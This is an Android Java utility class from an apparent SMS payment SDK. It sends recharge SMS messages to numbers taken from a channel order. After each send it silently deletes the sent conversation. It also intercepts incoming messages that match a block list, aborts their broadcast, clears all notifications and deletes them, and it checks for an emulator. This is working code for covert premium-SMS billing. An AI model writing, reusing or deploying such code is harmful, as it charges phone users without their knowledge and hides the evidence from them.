package com.example.sayid.myapplication.smsutil;


import android.app.Activity;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.OnActionListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.thread.TimeJudge;
import com.example.sayid.myapplication.common.util.SmsWriteOpUtil;
import com.example.sayid.myapplication.common.util.TelephonyUtil;
import com.example.sayid.myapplication.model.ChannelOrderResp;

import java.util.ArrayList;
import java.util.List;

import static com.example.sayid.myapplication.pay.AppTache.context;
import static com.example.sayid.myapplication.sms.SendSms.ITEMS;


public class SmSutils {

    private static SmSutils instance;
    private static SmSReceiver mySmSReceiver;
    private static Context mContext = context;
    private NotificationManager myNotificationManager;
    private static boolean isSendResults = false;
    public static ChannelOrderResp bean;


    /**
     * 用handler处理收到的短信
     */
    private SmSutils() {
        super();
        this.mContext = context;
        this.mySmSReceiver = new SmSReceiver();
        this.mContext.registerReceiver(mySmSReceiver, new IntentFilter(SmSserver.SendState));
    }

    public void setBean(ChannelOrderResp bean) {
        this.bean = bean;
    }

    public ChannelOrderResp getBean() {
        if (bean != null)
            return bean;
        return null;
    }

    /***
     *保证线程安全
     */
    public static synchronized SmSutils getInstance() {
        if (instance == null) {
            instance = new SmSutils();
        }
        return instance;
    }

    /**
     * 中止消息广播  并在通知栏中取消短信通知 有些系统 暂时不匹配  后期优化
     */
    public void abortBroadcastSms(Bundle bundle, BroadcastReceiver receiver) {
        myNotificationManager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);

        BlockDao blockDao = new BlockDao(mContext);
        List<BlockBean> blockList = blockDao.selectMonitor();
        try {
            Object pdus[] = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
            String msg = "";
            String fromphone = "";
            for (SmsMessage message : messages) {
                msg += message.getMessageBody();
                fromphone = message.getOriginatingAddress();
                boolean isBlock = BlockBean.isBlock(mContext, blockList, fromphone, msg, true);
                if (isBlock) {
                    receiver.abortBroadcast();
                    //删除通知栏中的消息
                    myNotificationManager.cancelAll();
                    deleteSms(fromphone, msg);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 短信发送 回调
    public static void SmsSendCallback(BroadcastReceiver r, SmsSendCallback mySendSmsListener) {

        if (r.getResultCode() != Activity.RESULT_OK) {
            if (r.getResultCode() == SmsManager.RESULT_ERROR_GENERIC_FAILURE) {
                // 短信发送失败
                if (mySendSmsListener != null)
                    mySendSmsListener.onSendSmsFailed(ErrorCode.CODE_114003);
            } else {
                // 短信发送异常
                if (mySendSmsListener != null)
                    mySendSmsListener.onSendSmsFailed(ErrorCode.CODE_114013);
            }
            isSendResults = false;
        } else {
            // 短信发送成功
            isSendResults = true;
            Uri inboxUri = Uri.parse("content://sms");
            try {
                ContentResolver CR = context.getContentResolver();
                Cursor c = CR.query(inboxUri, null, null, null, "date desc");
                if (c != null) {
                    if (c.moveToFirst()) {
                        String address = c.getString(c.getColumnIndex("address"));
                        String body = c.getString(c.getColumnIndex("body"));
                        long threadId = c.getLong(1);
                        int result = CR.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                        if (mySendSmsListener != null)
                            mySendSmsListener.onSendSmsSuccess();
                    }
                    c.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 发送短信
     */
    public static void sendSMS(String phonenumber, String msg) {

        try {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<PendingIntent> sentIntent = null;
            ArrayList<String> msgs = smsManager.divideMessage(msg);

            if (mContext != null) {
                sentIntent = new ArrayList<PendingIntent>();
                for (int i = 0; i < msgs.size(); i++) {
                    PendingIntent pd = PendingIntent.getBroadcast(mContext, i, new Intent(SmSserver.SendState), 0);
                    sentIntent.add(pd);
                }
            }
            smsManager.sendMultipartTextMessage(phonenumber, null, msgs, sentIntent, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 发送短信
     */
    public static void sendSMS(final String user_order_id, final String pay_order_id, final String phonenumber, final String msg, final SendSmsListener sendSmsListener) {

        if (TextUtils.isEmpty(phonenumber) || TextUtils.isEmpty(msg)) {
            //  发送号码或内容为空
        } else {
            try {
                SmsWriteOpUtil.setWriteEnabled(context, true);
                SmsManager smsManager = SmsManager.getDefault();
                ArrayList<PendingIntent> sentIntent = null;
                ArrayList<String> msgs = smsManager.divideMessage(msg);
                if (mContext != null) {
                    sentIntent = new ArrayList<>();
                    for (int i = 0; i < msgs.size(); i++) {
                        PendingIntent pd = PendingIntent.getBroadcast(mContext, i, new Intent(SmSserver.SendState), 0);
                        sentIntent.add(pd);
                    }
                }
                smsManager.sendMultipartTextMessage(phonenumber, null, msgs, sentIntent, null);
                if (mySmSReceiver == null) {
                    mySmSReceiver = new SmSReceiver();
                    mContext.registerReceiver(mySmSReceiver, new IntentFilter(SmSserver.SendState));
                }

                mySmSReceiver.setSendSmsListener(new SmsSendCallback() {
                    @Override
                    public void onSendSmsSuccess() {
                        if (sendSmsListener != null) {
                            sendSmsListener.onSendSmsSuccess(user_order_id, pay_order_id, phonenumber, msg, ITEMS);
                        }
                    }

                    @Override
                    public void onSendSmsFailed(String errorcode) {
                        //   短信发送失败
                        if (errorcode.equals(ErrorCode.CODE_114003)) {
                            if (sendSmsListener != null)
                                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114003);
                        }
                        //   短信发送失败异常
                        if (errorcode.equals(ErrorCode.CODE_114013)) {
                            if (sendSmsListener != null)
                                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114013);
                        }
                        //   判断是否使用模拟器发充值短信
                        if (TelephonyUtil.isEmulator(mContext)) {
                            if (sendSmsListener != null)
                                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114004);
                        }
                        if (TextUtils.isEmpty(phonenumber) || TextUtils.isEmpty(msg)) {
                            //发送号码或内容为空
                            if (sendSmsListener != null)
                                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114000);
                        }
                    }
                });

                // 短信发送超时 一分钟后上报发送结果
                final TimeJudge timeJudge = new TimeJudge(10000, new OnActionListener() {
                    public void onActionFinished(int actionCode, int resultCode, Object data) {
                        if (!isSendResults) {
                            if (sendSmsListener != null)
                                if (checkPermission()) {
                                    sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114003);
                                } else {
                                    sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, phonenumber, msg, ITEMS, ErrorCode.CODE_114002);
                                }
                        }
                        isSendResults = false;
                    }
                }, 0);
                // 设置计时器
                timeJudge.start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 删除收件箱中的短信
     */

    public static void deleteSms(String phoneNum, String smsContext) {
        try {
            ContentResolver CR = mContext.getContentResolver();
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = CR.query(uriSms, null, null, null, "date desc");
            if (null != c) {
                if (c.moveToFirst()) {
                    String address = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    if (address.equals(phoneNum)) {
                        //Delete SMS
                        long threadId = c.getLong(1);
                        CR.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static boolean checkPermission() {
        return (PackageManager.PERMISSION_GRANTED == context.getPackageManager().checkPermission("android.permission.SEND_SMS", context.getPackageName()));
    }
}
